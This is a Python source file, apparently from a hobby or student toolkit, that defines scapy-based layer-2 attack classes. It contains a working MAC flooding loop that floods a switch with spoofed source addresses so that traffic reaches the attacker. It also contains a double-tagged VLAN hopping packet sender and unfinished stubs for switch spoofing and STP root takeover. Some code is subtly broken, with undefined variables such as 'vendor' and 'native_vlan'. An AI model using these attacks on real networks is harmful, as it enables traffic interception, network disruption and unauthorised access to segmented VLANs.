from scapy.all import *
from threading import Thread
from time import sleep


class MacFlood(Exploit):
    """
    This exploit implements a basic MAC Flooding attack - by flooding a switch with fake MAC addresses, the switch will no longer have space in its MAC address table and packets from then on will be flooded to all hosts including the attacker
    """

    def __init__(self):
        super().__init__()
        self.verbosity = 0
        self.vendor = 'b8:e8:56:'
        self.target_mac = 'FF:FF:FF:FF:FF:FF'
        self.name = "MAC Flood"
        self.about = "MAC Flood: MAC Flooding attack to flood the switch's MAC address table"

        self.params = {
            "verbosity": self.verbosity,
            "vendor": self.vendor,
            "target_mac": self.target_mac,
        }

    def exploit(self):
        """
        As MAC address tables have a default decay timing of 300 seconds, to perpetutate this attack packets need to be constantly sent at a optimal rate.
        """
        logging.info(f"Beginning MAC Flood attack on {self.target_ip}")

        self.setup()

        while True:
            try:
                randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
                print(randMAC)
                sendp(Ether(src=randMAC, dst=self.target_mac) / ARP(op=2, psrc="0.0.0.0",
                                                                    hwdst=self.target_mac) / Padding(load="X"*18), verbose=self.verbosity)
            except KeyboardInterrupt:
                logging.info("Ending MAC Flooding Attack...")
                break

# Maybe implement threading? idk


# class switch_spoof(Exploit):
    """
    this attack is weird and i have no idea how to implement it since its only making our computer to enable trunking
    """


class double_tagging(Exploit):
    """
    Double tagging attack such that we can access a vlan we are not supposed to
    """

    def __init__(self):
        super().__init__()
        self.native_vlan = native_vlan
        self.target_vlan = target_vlan
        self.target_ip = target_ip
        self.name = "Vlan Hopping(Double tagging attack)"
        self.about = "Vlan Hopping(Double tagging attack): Sending a double 802.1q encapsulated packet with the inner vlan the target vlan and the outer vlan our vlan"

        self.params = {
            "native_vlan": self.native_vlan,
            "dest_vlan": self.target_vlan,
            "target_ip": self.target_ip,
        }

    def exploit(self):
        """
        Sends the double tagged packet out
        """
        try:
            dbl_tagged_pkt = Ether() / Dot1Q(vlan=self.native_vlan) / \
                Dot1Q(vlan=self.target_vlan) / IP(dst=self.target_ip) / ICMP()
            sendp(dbl_tagged_pkt)

        except Exception as e:
            logging.info("Exploit failed...")
            print(e)


class STPattack(Exploit):
    """
    Sends a BPDU with lower BID to take over the root switch
    """
    pass
